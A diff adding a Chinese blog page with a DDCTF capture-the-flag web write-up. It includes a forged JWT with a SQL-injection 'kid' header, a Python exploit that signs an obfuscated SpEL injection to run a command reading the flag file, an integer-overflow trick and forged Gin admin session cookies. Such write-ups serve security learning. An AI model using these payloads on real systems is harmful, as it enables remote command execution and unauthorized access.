@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效 -->
+<script type="text/javascript" src="\js\snow.js"></script>
+<!--动态线条背景-->
+<script>window.onload = function () {
+            hljs.initHighlighting();
+        }</script>
+
+
+  <body>
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="董沅鑫, yuanxin.me@gmail.com" />
+  
+  
+  
+  <title>DDCTF | iluem&#39;Blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Hexo, theme-bmw" />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">iluem.xyz</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>链接</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/qhaoduoyu" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>DDCTF</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2020-09-04
+    </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="passagesDDCTF"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="DDCTF"><a href="#DDCTF" class="headerlink" title="DDCTF"></a>DDCTF</h2><h3 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h3><p><img src="https://i.loli.net/2020/09/04/bomrWtFGZpYaAHS.png" alt="image-20200904120213082"></p>
+<p>jwt伪造</p>
+<pre><code>username=1&amp;pwd=1&amp;token=eyJhbGciOiJIUzI1NiIsImtpZCI6IjAgdW5pb24gc2VsZWN0IDEiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyTmFtZSI6IjEiLCJwd2QiOiIxIiwidXNlclJvbGUiOiJBRE1JTiIsImV4cCI6MTU5OTI3ODA1OH0.6DlTlDJm7AYu6KnvDsXgWAOfuAyKyemIKYT6UOh1AF4</code></pre><p>得到</p>
+<pre><code>{&quot;code&quot;:0,&quot;message&quot;:&quot;success&quot;,&quot;data&quot;:&quot;client dowload url: http://117.51.136.197/B5Itb8dFDaSFWZZo/client&quot;}</code></pre><p>下载client，是一个可执行文件</p>
+<p>运行效果如下</p>
+<p><img src="https://i.loli.net/2020/09/06/MyR5bKtGPgm2EiA.png" alt="image-20200906131039394"></p>
+<p>flag在<code>/home/dc2-user/flag/flag.txt</code></p>
+<p>signature格式是<code>command|timestamp</code></p>
+<p>交给iyzyi师傅分析，说是<code>sha256+base64</code>签名的，还有个<code>DDCTFWithYou</code>不知道干嘛用的，直接<code>sha256+base64</code>不对，最终找到是<code>HMAC-SHA256</code>，搜索<code>sha256+base64</code>签名可以搜到相关内容</p>
+<p><a href="https://cloud.tencent.com/document/product/228/10771" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/228/10771</a></p>
+<p>然后一测试果然对了</p>
+<p>后边是一个<code>spel</code>模板注入</p>
+<p>参考<a href="https://www.k0rz3n.com/" target="_blank" rel="noopener">K0rz3n</a>的一篇文章</p>
+<p>放上最终exp</p>
+<pre><code class="python">import hmac
+import base64
+import time
+from hashlib import sha256
+import requests
+import json
+t=str(int(time.time()))
+command=&#39;&#39;&#39;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())&#39;&#39;&#39;
+#/home/dc2-user/flag/flag.txt           
+tmp=command+&quot;|&quot;+t
+appsecret = b&quot;DDCTFWithYou&quot; #  秘钥
+data = bytes(tmp,encoding=&#39;utf-8&#39;) #  加密数据
+signature= base64.b64encode(hmac.new(appsecret, data, digestmod=sha256).digest())
+signature=str(signature,encoding=&#39;utf-8&#39;)
+datas=json.dumps({&quot;signature&quot;:signature,&quot;command&quot;:command,&quot;timestamp&quot;:t})
+url=&#39;http://117.51.136.197/server/command&#39;
+r=requests.post(url,data=datas)
+print(r.text)</code></pre>
+<h3 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h3><p><img src="https://i.loli.net/2020/09/06/oweZGlE9Cdj4urv.png" alt="image-20200906133628759"></p>
+<p>提示说100张卡能兑换礼物，但是截止时间只有两三分钟的样子。靠它本身给的游戏规则自然是不能在这时间内拿到100张卡。</p>
+<p>但是借一个很大的数似乎会溢出<code>loans?loans=9999999999999</code>，然后我们就有足够的钱去卖</p>
+<p><img src="https://i.loli.net/2020/09/06/mSp2hoqJYIgA7zu.png" alt="image-20200906134014973"></p>
+<p>点击兑换后</p>
+<p><img src="https://i.loli.net/2020/09/06/mSp2hoqJYIgA7zu.png" alt="image-20200906134048180"></p>
+<p>提示 : “恭喜你，买到了礼物，里面有夹心饼干、杜松子酒和一张小纸条，纸条上面写着：url: /flag , SecKey: Udc13VD5adM_c10nPxFu@v12，你能看懂它的含义吗？”</p>
+<p><img src="C:%5CUsers%5C18751%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200906134216934.png" alt="image-20200906134216934"></p>
+<p>其中杜松子酒是<code>gin</code>的意思，在这里是指go的gin框架。然后接下来拿出凡哥<code>iv4n</code>写的工具一键修改session。</p>
+<pre><code class="bash">root@kali:~# ./faker dec -c &quot;MTU5OTM3MTA2MXxEdi1CQkFFQ180SUFBUkFCRUFBQV81cl9nZ0FDQm5OMGNtbHVad3dJQUFaM1lXeHNaWFFHYzNSeWFXNW5ER01BWVhzaWIzZHBibWR6SWpwYlhTd2lhVzUyWlhOMGN5STZXMTBzSW0xdmJtVjVJam81T1RrNU9UazRNVEkxTURnd016Z3pMQ0p1YjNkZmRHbHRaU0k2TVRVNU9UTTNNRGszTlN3aWMzUmhjblJmZEdsdFpTSTZNVFU1T1RNM01EYzVOWDBHYzNSeWFXNW5EQWNBQldGa2JXbHVCR0p2YjJ3Q0FnQUF8syX_1eT-vi_9JYZ5XR8hbomW0lRg7HQ-f896e1YlNQk=&quot; 
+map[admin:false wallet:{&quot;owings&quot;:[],&quot;invests&quot;:[],&quot;money&quot;:9999998125080383,&quot;now_time&quot;:1599370975,&quot;start_time&quot;:1599370795}]
+type detail: 
+{
+    admin[string]: false[bool],
+    wallet[string]: {&quot;owings&quot;:[],&quot;invests&quot;:[],&quot;money&quot;:9999998125080383,&quot;now_time&quot;:1599370975,&quot;start_time&quot;:1599370795}[string],
+}</code></pre>
+<p>设置一个admin的session</p>
+<pre><code class="bash">root@kali:~# ./faker enc -n &quot;session&quot; -k &quot;Udc13VD5adM_c10nPxFu@v12&quot; -o &quot;{admin: true[bool]}&quot;
+MTU5OTM3MTgzMXxFXy1CQkFFQkEwOWlhZ0hfZ2dBQkVBRVFBQUFkXzRJQUFRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0RVltOXZiQUlDQUFFPXzYYKFyR_6b58VGMVEMyyo4S4AwUcXMEVAiF1VqOCXQvw==</code></pre>
+<p>即可拿到flag</p>
+<p><img src="https://i.loli.net/2020/09/06/Boc5KT9kquDpSfy.png" alt="image-20200906135738628"></p>
+
+    </div>
+  </div>
+  
+  
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/passagesGACTF%20%20Web%20Writeup/" target="_self">GACTF 2020 Web Writeup</a>
+      </div>
+    
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz",
+      appKey: "sivgWCRfGcA6BX905S8dIz1E",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz", "sivgWCRfGcA6BX905S8dIz1E");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw" target="_blank" rel="noopener">BMW</a> | Made With 💗 | Powered by <a href="https://godbmw.com/" target="_blank" rel="noopener">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2020, 5, 8).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+
+
+
+  </body>
+  
+  
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+
+
+
+</html>
